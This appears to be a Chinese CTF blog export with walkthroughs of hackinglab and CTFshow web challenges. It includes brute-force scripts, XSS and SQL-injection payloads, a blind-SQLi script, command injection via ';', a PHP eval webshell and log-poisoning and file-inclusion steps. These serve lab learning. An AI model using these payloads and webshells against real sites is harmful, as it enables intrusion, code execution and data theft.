re.search(r&#39;(\d+[+*])+(\d+[+*])+\((\d+[+*])+(\d+)\)&#39;, source).group()print(expression)val = str(eval(expression))print(val)post = {&#39;v&#39;: val}result = requests.post(url, headers=head, data=post).content.decode(&#39;utf-8&#39;)print(result)</code></pre><p>让脚本带着cookie值，以便于用户访问页面的时候进行身份验证。</p><p>重要的是后面的赋值给r2，r3的代码不理解，还是需要学python才行</p><h2 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a>怎么就是不弹出key呢？</h2><p>在<script>标签中，存在三个扰乱的函数return false；删除前三个函数，在本地重新执行代码（注：需有phpstudy环境支持），得到弹窗，截取前十四位字符，即为key：slakfjteslkjsd</p><h2 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h2><p>hint：进入登陆页面后，User信息已给出，密码提示为：<strong>第一位不为0的4位纯数字</strong>，但需要输入验证码登陆。</p><p>这是怎么个验证码漏洞：验证码的生成与cookie有关，所以脚本要围绕着cookie值来写</p><pre><code># -*- coding : utf-8 -*-import requestsurl = &#39;http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&#39;for password in range(1000, 9999):    head = {&#39;Cookie&#39;: &#39;PHPSESSID=98db957833ad06f20d20765aed472328&#39;}    post = {&#39;username&#39;: &#39;admin&#39;, &#39;pwd&#39;: password, &#39;vcode&#39;: &#39;ws2b&#39;, &#39;submit&#39;: &#39;submit&#39;}    result = requests.post(url, headers=head, data=post).text    print(password)    if len(result) != 9:     print(&quot;The passowrd is : &quot;+str(password))     print(result)     break</code></pre><p>同样，既然是通过bp抓包获得的cookie，那么直接在bp里面爆破就行：1238</p><h2 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h2><p>hint：验证便失效的验证码</p><p>当验证码为空时可以实现爆破</p><h2 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h2><p>Tips:密码是4位数字，首位不是0<br>Tips2: SESSION</p><p>与第二期无异</p><h2 id="微笑一下就能过关"><a href="#微笑一下就能过关" class="headerlink" title="微笑一下就能过关"></a>微笑一下就能过关</h2><p>查看文件源代码：</p><pre><code>&lt;?php      header(&quot;Content-type: text/html; charset=utf-8&quot;);    if (isset($_GET[&#39;view-source&#39;])) {         show_source(__FILE__);         exit();     }     include(&#39;flag.php&#39;);     $smile = 1;     if (!isset ($_GET[&#39;^_^&#39;])) $smile = 0;      if (preg_match (&#39;/\./&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;      /**格式：&#39;//&#39;     * \的作用是将.进行转义使在&#39;&#39;中能被转义出来    */    if (preg_match (&#39;/%/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;      if (preg_match (&#39;/[0-9]/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;      if (preg_match (&#39;/http/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;      if (preg_match (&#39;/https/&#39;, $_GET[&#39;^_^&#39;]) ) $smile = 0;      if (preg_match (&#39;/ftp/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;      if (preg_match (&#39;/telnet/&#39;, $_GET[&#39;^_^&#39;])) $smile = 0;      if (preg_match (&#39;/_/&#39;, $_SERVER[&#39;QUERY_STRING&#39;])) $smile = 0;     if ($smile) {         if (@file_exists ($_GET[&#39;^_^&#39;])) $smile = 0;      }      if ($smile) {         $smile = @file_get_contents ($_GET[&#39;^_^&#39;]);          if ($smile === &quot;(●&#39;◡&#39;●)&quot;) die($flag);      }  ?&gt;  </code></pre><p>file_get_contents() 函数把整个文件一次性读入一个字符串中。</p><p>例子：</p><pre><code>&lt;?phpecho file_get_contents(&quot;test.txt&quot;);?&gt;输出：This is a test file with test text.PHP Filesystem 函数&lt;?php//全国，判断条件是$REQUEST_URI是否含有htmlif (!strpos($_SERVER[&quot;REQUEST_URI&quot;],&quot;.html&quot;))</code></pre><pre><code>1.必须对&quot;^_^&quot;赋值2.&quot;^_^&quot;的值不能有  .  %  [0-9]  http  https  ftp  telnet  这些东西3.$_SERVER[&#39;QUERY_STRING&#39;],即&quot;^_^=(输入的值)&quot;这个字符串不能有 _ 这个字符4.满足$smile!=05.file_exists ($_GET[&#39;^_^&#39;])必须为0.也就是$_GET[&#39;^_^&#39;]此文件不存在6.&quot;$smile&quot;必须等于&quot;(●&#39;◡&#39;●)&quot;.也就是file_get_contents($_GET[&#39;^_^&#39;])必须为&quot;(●&#39;◡&#39;●)&quot;</code></pre><pre><code>仔细分析可以发现,第3点与第1点矛盾了,既要对&quot;^_^&quot;赋值,又得想办法去掉&quot;^_^&quot;中的&quot;_&quot;,那么可以采用Url编码变为&quot;%5f&quot;.这样第3点就满足了.所以我们输入就应该为&quot;^%5f^&quot;.继续分析第2点,这个地方把  http  https  ftp  telnet  这些给过滤了,而第6点又要通过file_get_contents()取出$_GET[&#39;^_^&#39;]里的值.而根据第5点,$_GET[&#39;^_^&#39;]又必须不存在.所以$_GET[&#39;^_^&#39;]只能是字符串&quot;(●&#39;◡&#39;●)&quot;,不可能是文件名.那么file_get_contents()里的参数应该是啥呢.查了一下,发现data://完美符合.所以我们输入就应该为&quot;^%5f^=data:,(●&#39;◡&#39;●)&quot;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135341809" alt="这里写图片描述"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdn.net/20161027135356098" alt="这里写图片描述"></p><p>payload：</p><pre><code>http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●&#39;◡&#39;●)</code></pre><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1613478185&ver=2894&signature=ZsKKFmZlhTTbFrqZys6aaYlfeQ0BCbV*uMHZ*dm0s-ikbmwXPUY30xBoSEqCRGWhf7AhmMsbVOc*IX-Up5D3bIAGUQvWOf9gt0ykWsiOyB0dVxEYFSo7iK-DOTQEZVKL&new=1">file_get_contents("php://input")的使用方法</a></p><h2 id="逗比的手机验证码"><a href="#逗比的手机验证码" class="headerlink" title="逗比的手机验证码"></a>逗比的手机验证码</h2><p>hint：你的手机号码是13388886666，验证码将会以弹窗的形式给出</p><p>需要以13388886667的账号进行登录，所以利用6来获得验证码，登录的时候用7登录一样会成功</p><h2 id="基情燃烧的岁月"><a href="#基情燃烧的岁月" class="headerlink" title="基情燃烧的岁月"></a>基情燃烧的岁月</h2><p>Tips:你是一名黑客，你怀疑你的“（男/女）闺蜜”的出轨了，你要登陆TA手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码:13388886666</p><p>弹窗：手机验证码是：验证码发到手机上了，你看不到..是3位纯数字，开头不为0</p><p>意思应该是希望我们进行爆破，得到验证码为：200，</p><p>登录得到：你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br>前任的手机号码是:13399999999，同理爆破得到：LKK8*(!@@sd</p><h2 id="验证码识别（未完成）"><a href="#验证码识别（未完成）" class="headerlink" title="验证码识别（未完成）"></a>验证码识别（未完成）</h2><p>Tips:验证码依然是3位数</p><p>软件利用pkav</p><p>脚本：需要安装tesseract-ocr模块，通过tesseract来识别验证码</p><pre><code>import requestsimport reimport pytesseractfrom PIL import Imageimport urllib.requestimport syss = requests.Session()url = &quot;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/login.php&quot;head = {&#39;cookie&#39;: &#39;PHPSESSID=0a8197f36e6ab659fa5e0be5168b5b35&#39;}def main():    num = 100    while num &lt; 1000:        code = get_code()        get_url(num, code)        num += 1def get_code():    urllib.request.urlretrieve(&#39;http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/vcode.php&#39;, &#39;1.png&#39;)    code = pytesseract.image_to_string(Image.open(&#39;1.png&#39;))    code = code.replace(&#39; &#39;, &#39;&#39;)    # print(code)    try:        if len(code) == 4:            print(&#39;验证码是&#39;, code)            return code            # print(code)        else:            print(&quot;重新获取验证码！&quot;)            get_code()    except UnicodeEncodeError:        passdef get_url(num, code):    data = {&#39;username&#39;: &#39;13388886666&#39;, &#39;mobi_code&#39;: num, &#39;user_code&#39;: code, &#39;Login&#39;: &#39;submit&#39;}    res = s.post(url, data=data, headers=head).content.decode(&#39;utf-8&#39;)    if u&#39;error&#39; not in res:        print(res, &#39;密码是&#39;, num)        sys.exit()    else:        print(res, &#39;密码是&#39;, num, &#39;---错误&#39;)        # print(&quot;正在尝试...&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><h1 id="XSS关"><a href="#XSS关" class="headerlink" title="XSS关"></a>XSS关</h1><h2 id="XSS基础关"><a href="#XSS基础关" class="headerlink" title="XSS基础关"></a>XSS基础关</h2><p>XSS基础:很容易就可以过关.XSS类题目必须在平台登录才能进行.登录地址请参考左侧<子系统></p><p>payload：</p><pre><code>&lt;script&gt;alert(&#39;1&#39;);&lt;/script&gt;</code></pre><p>源代码文件中得到：alert("Please use alert(HackingLab)!!");</p><p>payload：</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>key：myxssteststart!</p><h2 id="XSS基础2-简单绕过"><a href="#XSS基础2-简单绕过" class="headerlink" title="XSS基础2:简单绕过"></a>XSS基础2:简单绕过</h2><p>payload：</p><pre><code>&lt;script&gt;alert(HackingLab);&lt;/script&gt;</code></pre><p>应该进行了检查：XSS_SCRIPT_DETECTED!!!被发现了</p><p>payload：</p><pre><code>&lt;h1&gt;666&lt;/h1&gt;</code></pre><p>得到实现大标题</p><pre><code>&lt;img&gt; 标签定义 HTML 页面中的图像。&lt;img&gt; 标签有两个必需的属性：src（规定显示图像的 URL，值为URL）和 alt（规定图像的替代文本，值为text）</code></pre><p>payload：</p><pre><code>&lt;img src=x onclick=alert(HackingLab)&gt;</code></pre><p>key is: xss2test2you</p><p><a href="https://www.runoob.com/tags/ref-eventattributes.html">HTML全局事件属性</a></p><p><strong>HTML 4 的新特性之一是可以使 HTML 事件触发浏览器中的行为，比方说当用户点击某个 HTML 元素时启动一段 JavaScript。</strong></p><h2 id="XSS基础3-检测与构造"><a href="#XSS基础3-检测与构造" class="headerlink" title="XSS基础3:检测与构造"></a>XSS基础3:检测与构造</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8817%E6%97%A51133_1.png" alt=""></p><p>payload（细节闭合）：</p><pre><code>alert&#39; onmousemove=alert(HackingLab)&gt;</code></pre><p><a href="https://www.runoob.com/tags/ev-onmouseover.html">onmouseover</a>：当鼠标指针移至元素之上时运行脚本</p><p><a href="https://www.runoob.com/tags/ev-onmousemove.html">onmousemove</a>：当鼠标指针移动时运行脚本</p><p>这里是当value的值是敏感值时，后边的载荷不会被过滤</p><h2 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h2><p>分值: 300</p><p>原理/原则/理念很重要.....不是所有的xss都叫特仑苏.. ^_^<br>Take it easy!</p><p>查看源代码：  </p><pre><code>Welcome !&lt;a href=&#39;&#39;&gt;Edit Profile(XSS HERE!)&lt;/a&gt; </code></pre><p>也就是说超链接为一个注入点</p><p>payload：</p><pre><code>alert&#39;onmouseover=alert(HackingLab)&gt;javasc&lt;c&gt;ript:al&lt;c&gt;ert(HackingLab) &#39; onmouseover=al&lt;c&gt;ert(HackingLab)&gt;</code></pre><p><a href="https://blog.csdn.net/Jacob12774/article/details/84778322?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">wp</a></p><h2 id="关于xss的其他恶意代码"><a href="#关于xss的其他恶意代码" class="headerlink" title="关于xss的其他恶意代码"></a>关于xss的其他恶意代码</h2><p>1.弹窗跨站：</p><pre><code>&lt;script&gt;window.open(&#39;http//www.xxx.com&#39;,&#39;width=200,height=200’)&lt;/script&gt;</code></pre><h1 id="注入关-环境崩了"><a href="#注入关-环境崩了" class="headerlink" title="注入关(环境崩了)"></a>注入关(环境崩了)</h1><h2 id="最简单的SQL注入"><a href="#最简单的SQL注入" class="headerlink" title="最简单的SQL注入"></a>最简单的SQL注入</h2><pre><code>username=&#39;admin&#39; or 1=1#&#39;password=&#39;123&#39;vcode=&#39;&#39;</code></pre><p><a href="http://blog.spoock.com/2016/06/28/sql-injection-1/">sql注入必备知识</a></p><h1 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h1><h2 id="请上传一张jpg格式的图片"><a href="#请上传一张jpg格式的图片" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 100</p><p>只能上传jpg格式的图片哦~！</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>只是前端验证，bp抓包绕过即可</p><h2 id="请上传一张jpg格式的图片-1"><a href="#请上传一张jpg格式的图片-1" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 150</p><p>只能是jpg哦！</p><p>同上</p><h2 id="请上传一张jpg格式的图片-2"><a href="#请上传一张jpg格式的图片-2" class="headerlink" title="请上传一张jpg格式的图片"></a>请上传一张jpg格式的图片</h2><p>分值: 150</p><p>只能是jpg哦！</p><p>bp修改位1.jpg.php</p><pre><code>function check(){                var filename=document.getElementById(&quot;file&quot;);                var str=filename.value.split(&quot;.&quot;);                var ext=str[1];                if(ext===&#39;jpg&#39;){                    return true;                }else{                    alert(&quot;请上传一张JPG格式的图片！&quot;);                    return false;                }                return false;            }</code></pre><p>对.进行了分离，判断以.为分割符号中的第二位是不是jpg</p></script></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之Web</title>
      <link href="/2021/02/09/ctfshow-zhi-web/"/>
      <url>/2021/02/09/ctfshow-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1807961841&auto=1&height=66"></iframe><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="萌新赛——签到题"><a href="#萌新赛——签到题" class="headerlink" title="萌新赛——签到题"></a>萌新赛——签到题</h2><pre><code>&lt;?php if(isset($_GET[&#39;url&#39;])){        system(&quot;curl https://&quot;.$_GET[&#39;url&#39;].&quot;.ctf.show&quot;);}else{        show_source(__FILE__);} ?&gt;</code></pre><p>get传递参数必须要有URL，然后根据URL里面的内容在系统下自动执行curl命令，解题的巧妙之处在于采用分割符“;”，分开执行命令，构造：</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;ls;www</code></pre><p>回显：flag index.php，继续构造：</p><pre><code>http://6ccdf3cc-acbc-4f35-9088-29fa2249cb64.chall.ctf.show:8080/?url=1;cat flag;www</code></pre><p>回显：ctfshow{4629237d-c047-42c9-aa96-3c31cdadace4}</p><h1 id="2021-02-18（VIP题目限免）"><a href="#2021-02-18（VIP题目限免）" class="headerlink" title="2021-02-18（VIP题目限免）"></a>2021-02-18（VIP题目限免）</h1><h2 id="前台JS绕过"><a href="#前台JS绕过" class="headerlink" title="前台JS绕过"></a>前台JS绕过</h2><p><strong>js前台拦截 === 无效操作</strong></p><p>当无法f12或者右键查看源代码的时候可以在URL栏view-source:http://网站/ 查看源码</p><h2 id="协议头信息泄露"><a href="#协议头信息泄露" class="headerlink" title="协议头信息泄露"></a>协议头信息泄露</h2><p>没思路的时候抓个包看看，可能会有意外收获</p><h2 id="robots后台泄露"><a href="#robots后台泄露" class="headerlink" title="robots后台泄露"></a>robots后台泄露</h2><p>robots.txt文件</p><h2 id="phps源码泄露"><a href="#phps源码泄露" class="headerlink" title="phps源码泄露"></a>phps源码泄露</h2><p><strong>phps源码泄露有时候能帮上忙</strong></p><p>关于 phps,phps 其实就是 PHP 的源代码文件, 通常用于提供给用户查看 PHP 代码, 因为用户无法直接通过 Web 浏览器看到 PHP 文件的内容, 所以需要用 phps 文件代替. 其实, 只要不用 PHP 等已经在服务器中注册过的 MIME 类型为文件即可, 但为了国际通用, 所以才用了 phps 文件类型.</p><p>访问 index.phps, 下载下来查看源代码, 即可得到 flag</p><h2 id="源码压缩包泄露"><a href="#源码压缩包泄露" class="headerlink" title="源码压缩包泄露"></a>源码压缩包泄露</h2><p><strong>解压源码到当前目录，测试正常，收工</strong></p><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><h2 id="版本控制泄露源码"><a href="#版本控制泄露源码" class="headerlink" title="版本控制泄露源码"></a>版本控制泄露源码</h2><p><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></p><p>/.git（可以用dirsearch扫描）</p><h2 id="版本控制泄露源码2"><a href="#版本控制泄露源码2" class="headerlink" title="版本控制泄露源码2"></a>版本控制泄露源码2</h2><p><strong>版本控制很重要，但不要部署到生产环境更重要。</strong></p><p>这次我猜是/.svn（是了）</p><h2 id="vim临时文件泄露"><a href="#vim临时文件泄露" class="headerlink" title="vim临时文件泄露"></a>vim临时文件泄露</h2><p><strong>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</strong></p><p>程序员使用vim编辑器编写一个<code>index.php</code>文件时，会有一个<code>.index.php.swp</code>文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php，同时多次意外退出并不会覆盖旧的<code>.swp</code>文件，而是会生成一个新的，例如<code>.swo</code>文件。</p><p>用vim编辑时，临时的缓存文件为/.swp/.swn/.swo</p><h2 id="cookie泄露"><a href="#cookie泄露" class="headerlink" title="cookie泄露"></a>cookie泄露</h2><p><strong>cookie 只是一块饼干，不能存放任何隐私数据</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51341_1.png" alt></p><p>ctfshow{86798bd4-7472-4782-ab08-4ff05ae8418a}</p><h2 id="域名txt记录泄露"><a href="#域名txt记录泄露" class="headerlink" title="域名txt记录泄露"></a>域名txt记录泄露</h2><p><strong>域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51346_2.png" alt></p><p><a href="http://www.jsons.cn/nslookup/" target="_blank" rel="noopener">在线域名解析记录</a></p><h2 id="敏感信息公布"><a href="#敏感信息公布" class="headerlink" title="敏感信息公布"></a>敏感信息公布</h2><p><strong>有时候网站上的公开信息，就是管理员常用密码</strong></p><p>用dirsearch扫描得到后台/admin</p><p>信息搜集到的有用信息：</p><p>Help Line Number : 372619038</p><p>eflyer</p><p>利用：</p><p>username：admin  password：372619038</p><h2 id="内部技术文档泄露"><a href="#内部技术文档泄露" class="headerlink" title="内部技术文档泄露"></a>内部技术文档泄露</h2><p><strong>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</strong></p><p>技术文档：document.pdf</p><p>默认后台地址：<a href="http://your-domain/system1103/login.php" target="_blank" rel="noopener">http://your-domain/system1103/login.php</a> </p><p>默认用户名：admin </p><p>默认密码：admin1103</p><p>访问/system1103/login.php 子目录，得到登录框输入账号密码即可</p><h2 id="编辑器配置不当"><a href="#编辑器配置不当" class="headerlink" title="编辑器配置不当"></a>编辑器配置不当</h2><p><strong>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</strong></p><p>/editor打开</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8818%E6%97%A51418_3.png" alt></p><p>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</p><p>访问</p><p>nothinghere/fl000g.txt</p><h2 id="密码逻辑脆弱"><a href="#密码逻辑脆弱" class="headerlink" title="密码逻辑脆弱"></a>密码逻辑脆弱</h2><p><strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></p><p><a href="mailto:1156631961@qq.com" target="_blank" rel="noopener">1156631961@qq.com</a></p><p>加好友看看吗，得到信息为：在西安</p><p>/admin密保问题：西安</p><p>您的密码已重置为admin7789</p><h2 id="探针泄露"><a href="#探针泄露" class="headerlink" title="探针泄露"></a>探针泄露</h2><p><strong>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</strong></p><p>/tz.php</p><p>phpinfo得到flag</p><h2 id="CDN穿透"><a href="#CDN穿透" class="headerlink" title="CDN穿透"></a>CDN穿透</h2><p><strong>透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</strong></p><p>我搜狗浏览器自带IP地址显示：flag{111.231.70.44}</p><p>也可以通过ping <a href="http://www.ctfshow.com获得" target="_blank" rel="noopener">www.ctfshow.com获得</a></p><h2 id="js敏感信息泄露"><a href="#js敏感信息泄露" class="headerlink" title="js敏感信息泄露"></a>js敏感信息泄露</h2><p><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></p><p>view-source</p><p>点开：js/Flappy_js.js</p><p>得到这个小游戏的整套源码</p><p>重要部分：</p><pre><code>var result=window.confirm(&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;);}else{var result=window.confirm(&quot;GAMEOVER\n鏄惁浠庢柊寮€濮�&quot;);</code></pre><p>Unicode解码：你赢了，去110.php看看</p><p>AK</p><h2 id="前端密钥泄露"><a href="#前端密钥泄露" class="headerlink" title="前端密钥泄露"></a>前端密钥泄露</h2><p><strong>密钥什么的，就不要放在前端了</strong></p><pre><code>&lt;!--    error_reporting(0);    $flag=&quot;fakeflag&quot;    $u = $_POST[&#39;username&#39;];    $p = $_POST[&#39;pazzword&#39;];    if(isset($u) &amp;&amp; isset($p)){        if($u===&#39;admin&#39; &amp;&amp; $p ===&#39;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#39;){            echo $flag;        }}    --&gt;</code></pre><p>post传参提交表单内容</p><pre><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></pre><h2 id="数据库恶意下载"><a href="#数据库恶意下载" class="headerlink" title="数据库恶意下载"></a>数据库恶意下载</h2><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</strong></p><p>/db/db.mdb</p><p>以txt文件格式保存打开搜索ctf得到flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><pre><code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></pre><p>payload：</p><pre><code>?url=../../../../etc/passwd</code></pre><p>得到回显，说明存在文件包含漏洞</p><p>payload:</p><pre><code>?url=php://input&lt;?php system(&quot;find / -name ctf*&quot;);?&gt;</code></pre><p>得到回显：</p><pre><code>/var/www/html/ctf_go_go_go/tmp/html/ctf_go_go_go</code></pre><p>payload：</p><pre><code>?url=php://input&lt;?php system(&quot;cat /var/www/html/ctf_go_go_go&quot;);?&gt;</code></pre><p><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">关于php://的具体信息</a>有必要看！！</p><p><a href="https://www.jb51.net/article/31317.htm" target="_blank" rel="noopener">php://input</a></p><p>ctfshow{99c4134f-64d8-4228-8d29-8fd9ef2682a2}</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></pre><p>payload:</p><pre><code>?url=../../../../etc/passwd</code></pre><p>得到回显，但是无法继web3的操作</p><p><strong>第一种：日志包含</strong><br>通过查看请求头可以知道服务器为nginx，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开。</p><p>为了防止url编码，需要在burp中修改UA为</p><pre><code>&lt;?php eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>接着菜刀或蚁剑连接:</p><pre><code>http://xxxxxxx/?url=/var/log/nginx/access.log</code></pre><p><strong>第二种：远程文件包含</strong>(未实现)<br>使用自己的公网地址，或者可以在这个网站免费注册域名<a href="https://natapp.cn/，将端口映射到本地的80端口上，打开自己电脑上的服务器，将一句话文件写入，直接菜刀连接" target="_blank" rel="noopener">https://natapp.cn/，将端口映射到本地的80端口上，打开自己电脑上的服务器，将一句话文件写入，直接菜刀连接</a>:</p><pre><code>http://xxxxxxx/?url=http://xxxxxxx/webshell.php</code></pre><h1 id="2021-02-19"><a href="#2021-02-19" class="headerlink" title="2021-02-19"></a>2021-02-19</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>题目：</p><pre><code> &lt;?php        $flag=&quot;&quot;;        $v1=$_GET[&#39;v1&#39;];        $v2=$_GET[&#39;v2&#39;];        if(isset($v1) &amp;&amp; isset($v2)){            if(!ctype_alpha($v1)){                die(&quot;v1 error&quot;);            }            if(!is_numeric($v2)){                die(&quot;v2 error&quot;);            }            if(md5($v1)==md5($v2)){                echo $flag;            }        }else{            echo &quot;where is flag?&quot;;        }    ?&gt;</code></pre><p><strong>ctype_alpha()函数</strong>是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。<strong>如果字符串只包含字母返回true ，否则返回FALSE。</strong></p><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。<strong>是返回true，不是返回false</strong></p><p>那么这里！=如果不是，就是要求v1必须是字母，v2必须是数字，同时满足v1的md5=v2的md5，接下来就涉及到：</p><p><strong>md5漏洞（md5碰撞）：</strong></p><p>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0<br>所以只要v1与v2的md5值以0E开头即可。</p><p><a href="https://blog.csdn.net/qq_38603541/article/details/97108663" target="_blank" rel="noopener">常见的MD5碰撞：md5值为0e开头</a></p><p>payload：</p><pre><code>/?v1=QNKCDZO&amp;v2=240610708</code></pre><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>post传参</p><p>payload：</p><pre><code>username=admin&#39; or 1=1#&amp;password=1</code></pre><p>出现sql inject error，测试特殊字符回显不变，当删去空格，返回初始页面</p><p>一般空格被过滤有如下替换方法<br>/**/<br>()<br>回车(url编码中的%0a)<br>`(tap键上面的按钮)<br>tap<br>两个空格</p><pre><code>username=admin&#39;%09union%09select%091,2,3=1#&amp;password=1username=admin&#39;%09union%09select%091,database(),3=1#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(table_name),3%09from%09information_schema.tables%09where%09table_schema=database()#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(column_name),3%09from%09information_schema.columns%09where%09table_name=&#39;flag&#39;#&amp;password=1username=admin&#39;%09union%09select%091,group_concat(flag),3%09from%09flag#&amp;password=1</code></pre><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>sql盲注脚本：</p><pre><code>import requestss=requests.session()url=&#39;http://5833fd10-7a3d-4f24-ad5d-93394514f061.chall.ctf.show:8080/index.php&#39;table=&quot;&quot;for i in range(1,45):    #print(i)    for j in range(31,128):        #爆表名  flag        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))        #爆字段名 flag        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))        #读取flag        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))        ra = s.get(url=url + &#39;?id=0/**/or/**/&#39; + payload).text        if &#39;I asked nothing&#39; in ra:            table += chr(j)            print(table)            break</code></pre><h1 id="2021-02-20"><a href="#2021-02-20" class="headerlink" title="2021-02-20"></a>2021-02-20</h1><p><strong>hints：register.php login.php 大佬们别扫了</strong></p><p>题目：</p><pre><code>&lt;?phpsession_start(); //开启Session功能include(&#39;config.php&#39;);if(empty($_SESSION[&#39;name&#39;])){    show_source(&quot;index.php&quot;);}else{    $name=$_SESSION[&#39;name&#39;];//读取Session变量信息    $sql=&#39;select pass from user where name=&quot;&#39;.$name.&#39;&quot;&#39;;    echo $sql.&quot;&lt;br /&gt;&quot;;    system(&#39;4rfvbgt56yhn.sh&#39;);    